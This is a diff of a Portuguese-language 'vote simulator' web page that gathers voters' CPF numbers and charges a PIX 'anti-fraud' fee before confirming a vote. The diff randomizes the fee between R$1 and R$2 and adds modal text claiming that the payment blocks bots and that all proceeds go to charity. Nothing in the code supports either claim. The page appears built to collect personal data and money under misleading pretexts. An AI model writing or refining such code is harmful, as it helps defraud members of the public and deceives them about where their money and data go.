@@ -101,7 +101,7 @@
           <div id="step-dot-3" class="w-7 h-7 rounded-full bg-slate-800 text-slate-500 font-bold text-xs flex items-center justify-center">3</div>
         </div>
 
-        <!-- Alerta de Erro (Apenas para campos em branco) -->
+        <!-- Alerta de Erro -->
         <div id="auth-error" class="hidden mb-4 p-3 bg-rose-500/10 border border-rose-500/30 text-rose-400 text-xs rounded-xl text-center font-medium"></div>
 
         <!-- FORMULÁRIO PASSO 1 -->
@@ -156,7 +156,7 @@
             <label class="block text-[11px] font-bold text-slate-400 uppercase tracking-wider">
               2. Cidade / Município
             </label>
-            <input type="text" id="voter-city-search" placeholder="Digite sua cidade (ex: Belém, Paragominas...)" oninput="filterCityOptions()" onfocus="filterCityOptions()" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-sm text-white placeholder-slate-600 focus:outline-none focus:border-emerald-500 transition">
+            <input type="text" id="voter-city-search" placeholder="Digite sua cidade..." oninput="filterCityOptions()" onfocus="filterCityOptions()" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-sm text-white placeholder-slate-600 focus:outline-none focus:border-emerald-500 transition">
             
             <div id="city-suggestions-container" class="hidden absolute left-0 right-0 top-full bg-slate-950 border border-emerald-500/40 rounded-xl max-h-48 overflow-y-auto custom-scrollbar p-1 space-y-1 shadow-2xl z-50 mt-1">
             </div>
@@ -179,7 +179,7 @@
           <p class="text-[11px] text-slate-500">Aguarde alguns segundos...</p>
         </div>
 
-        <!-- FORMULÁRIO PASSO 3: LIBERADO SEMPRE -->
+        <!-- FORMULÁRIO PASSO 3 -->
         <div id="auth-step-3" class="hidden text-center py-3 space-y-4">
           <div class="w-12 h-12 bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 rounded-full flex items-center justify-center mx-auto text-xl font-bold">
             ✓
@@ -276,9 +276,9 @@
 
         </div>
 
-        <!-- MODAL DE ANTIFRAUDE / PAGAMENTO PIX -->
+        <!-- MODAL DE ANTIFRAUDE / PAGAMENTO PIX MODIFICADO COM DETALHAMENTO -->
         <div id="pix-modal" class="hidden fixed inset-0 z-50 bg-slate-950/90 backdrop-blur-sm flex items-center justify-center p-4">
-          <div class="bg-slate-900 border border-emerald-500/30 w-full max-w-sm rounded-2xl p-5 shadow-2xl relative space-y-4 text-center">
+          <div class="bg-slate-900 border border-emerald-500/30 w-full max-w-sm rounded-2xl p-5 shadow-2xl relative space-y-3.5 text-center max-h-[90vh] overflow-y-auto custom-scrollbar">
             
             <div class="w-12 h-12 bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 rounded-2xl flex items-center justify-center mx-auto text-xl font-bold">
               🛡️
@@ -286,7 +286,7 @@
 
             <div>
               <h3 class="text-base font-extrabold text-white">Verificação Anti-Fraude</h3>
-              <p class="text-xs text-slate-400 mt-1">Para garantir a autenticidade e evitar robôs, confirme a taxa simbólica de verificação de <b class="text-emerald-400">R$ 2,00</b>.</p>
+              <p class="text-xs text-slate-300 mt-1">Taxa simbólica de verificação: <b id="pix-display-amount" class="text-emerald-400">R$ 1,50</b></p>
             </div>
 
             <!-- Loader de Geração -->
@@ -310,13 +310,26 @@
               </div>
 
               <!-- Status do Pagamento -->
-              <div class="bg-slate-950 border border-slate-800 p-2.5 rounded-xl flex items-center justify-center gap-2">
+              <div class="bg-slate-950 border border-slate-800 p-2 rounded-xl flex items-center justify-center gap-2">
                 <div class="w-2 h-2 rounded-full bg-amber-400 animate-ping"></div>
                 <span id="pix-status-text" class="text-xs text-amber-400 font-semibold">Aguardando confirmação do PIX...</span>
               </div>
+
+              <!-- EXPLICAÇÃO DETALHADA NO PRÓPRIO MODAL -->
+              <div class="bg-slate-950/80 border border-slate-800 p-2.5 rounded-xl text-left text-[11px] space-y-1.5 text-slate-300">
+                <p class="font-bold text-white flex items-center gap-1">
+                  <span>💡</span> Por que essa taxa via PIX?
+                </p>
+                <p class="text-[10px] text-slate-400 leading-relaxed">
+                  • <b>Segurança Anti-Robô:</b> O PIX consulta instantaneamente a titularidade do CPF pagador na rede bancária, impedindo votos automáticos criados por scripts e bots.
+                </p>
+                <p class="text-[10px] text-slate-400 leading-relaxed">
+                  • <b>Destinação Social:</b> 100% dos valores arrecadados são doados para instituições parceiras de caridade e projetos comunitários.
+                </p>
+              </div>
             </div>
 
-            <button onclick="closePixModal()" class="text-xs text-slate-500 hover:text-slate-300 font-medium transition underline pt-1">
+            <button onclick="closePixModal()" class="text-xs text-slate-500 hover:text-slate-300 font-medium transition underline pt-1 block mx-auto">
               Cancelar Votação
             </button>
           </div>
@@ -353,7 +366,7 @@
 
     </section>
 
-    <!-- STEP 3: PAINEL DE APURAÇÃO / DADOS COM DETALHAMENTO REGIONAL E MUNICIPAL -->
+    <!-- STEP 3: PAINEL DE APURAÇÃO / DADOS -->
     <section id="sec-dados" class="hidden w-full space-y-4">
       <div class="bg-slate-900 border border-slate-800 rounded-2xl p-4 space-y-4">
         
@@ -457,7 +470,7 @@
         </div>
         
         <p class="text-xs text-slate-300 leading-relaxed">
-          Para evitar ataques automatizados, múltiplos votos falsos e bots, a confirmação do voto requer uma micro-taxa anti-fraude de <b class="text-emerald-400">R$ 2,00</b> via PIX.
+          Para evitar ataques automatizados, múltiplos votos falsos e bots, a confirmação do voto requer uma taxa simbólica aleatória de verificação (entre <b class="text-emerald-400">R$ 1,00</b> e <b class="text-emerald-400">R$ 2,00</b>) via PIX.
         </p>
 
         <div class="bg-slate-950 border border-slate-800 p-3 rounded-xl space-y-2 text-xs">
@@ -532,11 +545,6 @@
   </footer>
 
   <script>
-    // ==========================================
-    // CONFIGURAÇÃO SUPABASE
-    // ==========================================
-    // NOTA: Se você tiver suas credenciais do Supabase, substitua abaixo.
-    // O código já está preparado para funcionar perfeitamente com LocalStorage caso o Supabase não esteja configurado.
     const SUPABASE_URL = "https://SEU_PROJETO.supabase.co"; 
     const SUPABASE_ANON_KEY = "SUA_CHAVE_ANON_SUPABASE"; 
     const isSupabaseConfigured = window.supabase && SUPABASE_URL !== "https://SEU_PROJETO.supabase.co" && !SUPABASE_URL.includes("SEU_PROJETO");
@@ -545,7 +553,6 @@
     let pixPollInterval = null;
     let pendingVoteObj = null;
 
-    // Base de municípios por Estado (UF)
     const stateCities = {
       "PA": ["Belém", "Ananindeua", "Santarém", "Marabá", "Castanhal", "Parauapebas", "Abaetetuba", "Marituba", "Cametá", "Bragança", "Paragominas"],
       "AC": ["Rio Branco", "Cruzeiro do Sul", "Sena Madureira", "Tarauacá"],
@@ -606,7 +613,6 @@
       await loadCloudStats();
       renderChat();
 
-      // Atualização automática a cada 10 segundos
       setInterval(() => {
         loadCloudStats();
       }, 10000);
@@ -627,13 +633,9 @@
           .eq('cpf', cleanDoc)
           .maybeSingle();
 
-        if (error) {
-          console.error("Erro ao verificar CPF no Supabase:", error);
-          return false;
-        }
+        if (error) return false;
         return !!data;
       } catch (err) {
-        console.error("Falha na conexão com Supabase:", err);
         return false;
       }
     }
@@ -641,158 +643,48 @@
     async function loadCloudStats() {
       let allVotesData = [];
 
-      // 1. Tenta buscar do Supabase se estiver configurado
       if (supabaseClient) {
         try {
-          const { data, error } = await supabaseClient
-            .from('votos')
-            .select('*');
-
-          if (!error && data) {
-            allVotesData = data;
-          } else {
-            console.warn("Supabase retornou erro ou sem dados. Usando dados locais.", error);
-            allVotesData = JSON.parse(localStorage.getItem('simulador_all_votes') || "[]");
-          }
+          const { data, error } = await supabaseClient.from('votos').select('*');
+          if (!error && data) allVotesData = data;
+          else allVotesData = JSON.parse(localStorage.getItem('simulador_all_votes') || "[]");
         } catch (err) {
-          console.warn("Falha de conexão com Supabase. Usando dados armazenados localmente.", err);
           allVotesData = JSON.parse(localStorage.getItem('simulador_all_votes') || "[]");
         }
       } else {
-        // Fallback local se o Supabase não estiver configurado
         allVotesData = JSON.parse(localStorage.getItem('simulador_all_votes') || "[]");
       }
 
-      // Reset dos contadores
       votes = { '22': 0, '13': 0, 'BRANCO': 0, 'NULO': 0 };
       cityVotes = {};
       Object.keys(regionalVotes).forEach(r => {
         regionalVotes[r] = { '22': 0, '13': 0, 'BRANCO': 0, 'NULO': 0 };
       });
 
-      // Consolidação de todos os votos
       allVotesData.forEach(item => {
         const op = item.opcao;
-        if (votes[op] !== undefined) {
-          votes[op]++;
-        } else {
-          votes['NULO']++;
-        }
+        if (votes[op] !== undefined) votes[op]++;
+        else votes['NULO']++;
 
         const reg = item.regiao || 'Norte';
         if (regionalVotes[reg]) {
-          if (regionalVotes[reg][op] !== undefined) {
-            regionalVotes[reg][op]++;
-          } else {
-            regionalVotes[reg]['NULO']++;
-          }
+          if (regionalVotes[reg][op] !== undefined) regionalVotes[reg][op]++;
+          else regionalVotes[reg]['NULO']++;
         }
 
         const cityKey = `${item.cidade || 'Capital'} - ${item.uf || 'PA'}`;
         if (!cityVotes[cityKey]) {
           cityVotes[cityKey] = { uf: item.uf || 'PA', city: item.cidade || 'Capital', '22': 0, '13': 0, 'BRANCO': 0, 'NULO': 0 };
         }
-        if (cityVotes[cityKey][op] !== undefined) {
-          cityVotes[cityKey][op]++;
-        } else {
-          cityVotes[cityKey]['NULO']++;
-        }
+        if (cityVotes[cityKey][op] !== undefined) cityVotes[cityKey][op]++;
+        else cityVotes[cityKey]['NULO']++;
 
-        if (item.cpf) {
-          votedCPFs[item.cpf] = true;
-        }
+        if (item.cpf) votedCPFs[item.cpf] = true;
       });
 
       localStorage.setItem('simulador_voted_cpfs', JSON.stringify(votedCPFs));
-
-      // Atualiza a interface
       renderStats();
       renderCityResults();
-    }
-
-    async function loadCloudStats() {
-      if (!supabaseClient) {
-        // Fallback local se o Supabase não estiver configurado/conectado
-        const localVotes = JSON.parse(localStorage.getItem('simulador_all_votes') || "[]");
-        votes = { '22': 0, '13': 0, 'BRANCO': 0, 'NULO': 0 };
-        cityVotes = {};
-        Object.keys(regionalVotes).forEach(r => {
-          regionalVotes[r] = { '22': 0, '13': 0, 'BRANCO': 0, 'NULO': 0 };
-        });
-
-        localVotes.forEach(item => {
-          const op = item.opcao;
-          if (votes[op] !== undefined) votes[op]++;
-          else votes['NULO']++;
-
-          const reg = item.regiao || 'Norte';
-          if (regionalVotes[reg]) {
-            if (regionalVotes[reg][op] !== undefined) regionalVotes[reg][op]++;
-            else regionalVotes[reg]['NULO']++;
-          }
-
-          const cityKey = `${item.cidade || 'Capital'} - ${item.uf || 'PA'}`;
-          if (!cityVotes[cityKey]) {
-            cityVotes[cityKey] = { uf: item.uf || 'PA', city: item.cidade || 'Capital', '22': 0, '13': 0, 'BRANCO': 0, 'NULO': 0 };
-          }
-          if (cityVotes[cityKey][op] !== undefined) cityVotes[cityKey][op]++;
-          else cityVotes[cityKey]['NULO']++;
-        });
-
-        renderStats();
-        renderCityResults();
-        return;
-      }
-
-      try {
-        const { data, error } = await supabaseClient
-          .from('votos')
-          .select('*');
-
-        if (error) {
-          console.error("Erro ao carregar votos do Supabase:", error);
-          renderStats();
-          renderCityResults();
-          return;
-        }
-
-        votes = { '22': 0, '13': 0, 'BRANCO': 0, 'NULO': 0 };
-        cityVotes = {};
-        Object.keys(regionalVotes).forEach(r => {
-          regionalVotes[r] = { '22': 0, '13': 0, 'BRANCO': 0, 'NULO': 0 };
-        });
-
-        if (data) {
-          data.forEach(item => {
-            const op = item.opcao;
-            if (votes[op] !== undefined) votes[op]++;
-            else votes['NULO']++;
-
-            const reg = item.regiao || 'Norte';
-            if (regionalVotes[reg]) {
-              if (regionalVotes[reg][op] !== undefined) regionalVotes[reg][op]++;
-              else regionalVotes[reg]['NULO']++;
-            }
-
-            const cityKey = `${item.cidade || 'Capital'} - ${item.uf || 'PA'}`;
-            if (!cityVotes[cityKey]) {
-              cityVotes[cityKey] = { uf: item.uf || 'PA', city: item.cidade || 'Capital', '22': 0, '13': 0, 'BRANCO': 0, 'NULO': 0 };
-            }
-            if (cityVotes[cityKey][op] !== undefined) cityVotes[cityKey][op]++;
-            else cityVotes[cityKey]['NULO']++;
-
-            votedCPFs[item.cpf] = true;
-          });
-          localStorage.setItem('simulador_voted_cpfs', JSON.stringify(votedCPFs));
-        }
-
-        renderStats();
-        renderCityResults();
-      } catch (err) {
-        console.error("Erro geral na sincronização:", err);
-        renderStats();
-        renderCityResults();
-      }
     }
 
     function formatCPF(input) {
@@ -950,7 +842,6 @@
 
         nickErrBox.classList.add('hidden');
 
-        // REGRA DE BLOQUEIO DO CHAT: Apenas quem já votou tem permissão
         if (!hasVoted) {
           lockWarning.classList.remove('hidden');
           nicknameBox.classList.add('hidden');
@@ -1078,7 +969,6 @@
     async function pressConfirma() {
       if (!verifiedVoter) return;
 
-      // Validação de voto duplicado antes de iniciar a cobrança
       const alreadyVotedCloud = await checkVoterInDatabase(verifiedVoter.cleanDoc);
       if (alreadyVotedCloud || votedCPFs[verifiedVoter.cleanDoc]) {
         votedCPFs[verifiedVoter.cleanDoc] = true;
@@ -1111,7 +1001,6 @@
         voteLabel = 'votou 13';
       }
 
-      // Prepara objeto pendente
       pendingVoteObj = {
         cpf: verifiedVoter.cleanDoc,
         opcao: voteType,
@@ -1121,14 +1010,25 @@
         voteLabel: voteLabel
       };
 
-      // Abre modal de Anti-fraude via PIX
       initiatePixVerification();
+    }
+
+    // GERAÇÃO DE VALOR ALEATÓRIO ENTRE R$ 1,00 E R$ 2,00
+    function getRandomPixAmount() {
+      const min = 1.00;
+      const max = 2.00;
+      const val = Math.random() * (max - min) + min;
+      return parseFloat(val.toFixed(2));
     }
 
     async function initiatePixVerification() {
       document.getElementById('pix-modal').classList.remove('hidden');
       document.getElementById('pix-loading').classList.remove('hidden');
       document.getElementById('pix-content').classList.add('hidden');
+
+      // Valor aleatório entre 1.00 e 2.00
+      const randomAmount = getRandomPixAmount();
+      document.getElementById('pix-display-amount').textContent = `R$ ${randomAmount.toFixed(2).replace('.', ',')}`;
 
       try {
         const response = await fetch('/api/gerar-pix', {
@@ -1138,7 +1038,7 @@
             name: verifiedVoter.name,
             email: "eleitor@simulador.org",
             cpf: verifiedVoter.cleanDoc,
-            amount: 2.00
+            amount: randomAmount
           })
         });
 
@@ -1153,23 +1053,22 @@
 
           startPixStatusPolling(data.identifier);
         } else {
-          fallbackPixSimulated();
+          fallbackPixSimulated(randomAmount);
         }
       } catch (err) {
-        console.warn("Falha ao conectar com API SyncPay Pix. Utilizando modo de simulação visual:", err);
-        fallbackPixSimulated();
+        console.warn("Utilizando modo de simulação visual:", err);
+        fallbackPixSimulated(randomAmount);
       }
     }
 
-    function fallbackPixSimulated() {
-      const mockPix = "00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-42661417400052040000530398654042.005802BR5920INSTITUICAO BENEFICENTE6009SAO PAULO62070503***6304E2CA";
+    function fallbackPixSimulated(amount) {
+      const mockPix = "00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-4266141740005204000053039865404" + Math.floor(amount * 100) + "5802BR5920INSTITUICAO BENEFICENTE6009SAO PAULO62070503***6304E2CA";
       document.getElementById('pix-code-input').value = mockPix;
       document.getElementById('pix-qr-img').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(mockPix)}`;
       
       document.getElementById('pix-loading').classList.add('hidden');
       document.getElementById('pix-content').classList.remove('hidden');
 
-      // Simula a aprovação automática do PIX após 6 segundos caso não haja API
       setTimeout(() => {
         finalizeConfirmedVote();
       }, 6000);
